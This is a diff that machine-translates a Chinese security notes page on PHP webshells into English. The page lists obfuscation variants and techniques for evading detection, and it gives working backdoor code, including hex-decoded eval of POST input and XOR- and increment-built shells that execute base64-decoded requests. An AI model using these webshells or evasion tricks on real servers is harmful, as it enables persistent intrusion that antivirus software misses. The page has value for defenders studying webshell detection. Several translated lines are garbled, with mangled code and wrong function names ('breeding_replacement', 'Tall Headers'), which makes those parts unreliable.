@@ -1,76 +1,76 @@
 WebShell
 ================================
 
-常见变形
+Common deformations
 --------------------------------
 - GLOBALS
-    - ``eval($GLOBALS['_POST']['op']);``
+- ``eval($GLOBALS['_POST']['op']);``
 - ``$_FILE``
-    - ``eval($_FILE['name']);``
-- 拆分
-    - ``eval(${"_PO"."ST"} ['sz']);``
-- 动态函数执行
-    - ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
-    - ``$a=$_GET['a'];$a($_GET['b']);``
+- ``eval($_FILE['name']);``
+- Split
+- `` `Eval ($ {" _ after "." Wed "} ['sz']);` `
+- Dynamic function execution
+- ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
+- ``$a=$_GET['a'];$a($_GET['b']);``
 - create_function
-    - ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
+- ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
 - preg_replace
-- 变形
-    - str_replace(" ", "e v a l")
-- 进制转化
-    - ``"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145"``
-- 进制运算
-    - ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
-- 自增运算
-    - ``$a="a";$a++;``
-- 强制类型转换
-    - ``$a='';$a.=[]; // Array``
-- 利用文件名
-    - ``__FILE__``
-- 注释
-    - ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
-- 反射
-    - ``ReflectionFunction``
+- Deformation
+- str_replace ("", "e v a l")
+- Category conversion
+- ``"\x62\x61s\x65\x36\x34_de\x63\x6fde"``
+- Category operation
+- ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
+- Self-increasing operation
+- ``$a="a";$a++;``
+- Forced type conversion
+- ``$a='';$a.=[]; // Array``
+-Use file names
+- ``__FILE__``
+- Comments
+- ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
+- Reflection
+- ``ReflectionFunction``
 
 Bypass
 --------------------------------
-- 基于少见函数
-    - ``mb_eregi_replace('.*',$_GET[1],'','e');``
-    - set_error_handler + trigger_error
-- 基于污染传播
-    - ``putenv($_GET["c"]);eval(getenv('path'));``
-    - parse_str
-    - parse_url
-    - extract
-    - token_get_all
-    - define
-- 基于少见源
-    - ``$a = filter_input(INPUT_GET,'c');``
-    - ``eval(end(getallheaders()));``
-    - get_defined_vars
-    - getallheaders
-    - get_meta_tags
-    - phpinfo
-    - 外部变量 / 文件信息
-    - 重载 toString
+- Based on rare functions
+- ``breeding_replacement_replacement.
+- set_error_handler + trigger_error
+- Based on pollution transmission
+- ``putenv($_GET["c"]);eval(getenv('path'));``
+- parse_str
+- Parese_url
+- extract
+- token_get_all
+- define
+- Based on rare sources
+- ``$a = filter_input(INPUT_GET,'c');``
+- `` evales (end (number heads ())); `` `` ``
+- get_defined_vars
+- Tall Headers
+- get_meta_tags
+- phpinfo
+- External variables/file information
+- Overload toString
 
-字符串变形函数
+String deformation function
 --------------------------------
 - base64_decode
 - base64_encode
-- str_replace
+- Str_replace
 - str_rot13
-- strtok
+ash
 - strtolower
-- strtoupper
-- strtr
+- Strtoupper
+- Strtr
 - substr
 - substr_replace
 - trim
 - ucfirst
 - ucwords
 
-回调函数
+Callback function
 --------------------------------
 - array_filter
 - array_map
@@ -81,95 +81,95 @@ Bypass
 - call_user_func
 - call_user_func_array
 - filter_var
-- filter_var_array
+- filter_ar array
 - preg_replace_callback
 - register_tick_function
 - registregister_shutdown_function
-- uasort
-- uksort
+- max
+- Uksort
 
-加解密函数
+Encrypt and decrypt functions
 --------------------------------
 - mcrypt_encrypt
 - openssl_encrypt
 
-其他执行方式
+Other ways of execution
 --------------------------------
 - FFI
 - SimpleXML
 - SimpleXMLElement
 
-自定义函数
+Custom functions
 --------------------------------
-使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。
+Using custom encryption and decryption functions, some protection software can be bypassed to a certain extent. The following code is a simple example of hexadecimal execution.
 
 .. code:: php
 
-    $string = '';
-    $password = 'password';
-    if(isset($_POST[$password])){
-        $hex = $_POST[$password];
-        for($i = 0; $i < strlen($hex) - 1; $i += 2) {
-            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
-        }
-    }
-    eval($string);
+$string = '';
+$password = 'password';
+if(isset($_POST[$password])){
+$hex = $_POST[$password];
+for($i = 0; $i < strlen($hex) - 1; $i += 2) {
+$string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+}
+}
+eval($string);
 
-特殊字符Shell
+Special character shell
 --------------------------------
-PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。
+PHP strings can directly perform operations when performing XOR and autoincrement operations, so special characters can be used to form a shell.
 
 .. code:: php
 
-    <?=`{${~"\xa0\xb8\xba\xab"}[~"\xa0"]}`;
+<? = `` {{$ {{{"{{" ~ "\ Send0 \ xb8 \ xba \ xb}`;
 
 .. code:: php
 
-    @$_++;
-    $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
-    @${$__}[!$_](${$__}[$_]);
+@$_++;
+$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
+@${$__}[!$_](${$__}[$_]);
 
 
 .. code:: php
 
-    $_=[];
-    $_=@"$_"; // $_='Array';
-    $_=$_['!'=='@']; // $_=$_[0];
-    $___=$_; // A
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
-    $___.=$__; // S
-    $___.=$__; // S
-    $__=$_;
-    $__++;$__++;$__++;$__++; // E 
-    $___.=$__;
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
-    $___.=$__;
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
-    $___.=$__;
-    $____='_';
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
-    $____.=$__;
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
-    $____.=$__;
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
-    $____.=$__;
-    $__=$_;
-    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
-    $____.=$__;
+$_=[];
+$_=@"$_"; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+$____='_';
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
 
-    $_=$$____;
-    $___(base64_decode($_[_]));
+$_=$$____;
+$___(base64_decode($_[_]));
 
-检测对抗
+Detect confrontation
 --------------------------------
-- 基于混淆影响程序分析
-- 基于动态变量影响程序执行
-- 抛出异常打断数据流分析
-- 基于反射打断数据流分析
-- 基于引用传递打断数据流分析
+- Analysis based on obfuscation impact program
+- Influence program execution based on dynamic variables
+- Throw an exception to interrupt data flow analysis
+- Reflection-based interruption data flow analysis
+- Interrupt data flow analysis based on reference delivery
